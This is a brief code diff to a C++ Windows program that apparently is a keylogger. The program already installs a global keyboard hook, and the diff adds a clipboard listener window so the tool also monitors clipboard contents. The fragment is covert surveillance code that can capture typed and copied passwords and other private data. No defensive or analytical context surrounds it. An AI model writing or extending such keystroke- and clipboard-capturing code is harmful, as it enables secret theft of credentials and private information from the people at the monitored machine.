@@ -28,6 +28,9 @@ int main(int argc, char* argv[]) {
         std::cerr << "Kb Hook Installation Failed: " << GetLastError() << std::endl;
         return 1;
     }
+
+    HWND hwnd = kl.CreateCbWindow();
+    AddClipboardFormatListener(hwnd);
     
     MSG msg;
     BOOL bRet;
@@ -42,6 +45,7 @@ int main(int argc, char* argv[]) {
     }
 
     UnhookWindowsHookEx(hKeyboardHook);
+    RemoveClipboardFormatListener(hwnd);
 
     return 0;
 }
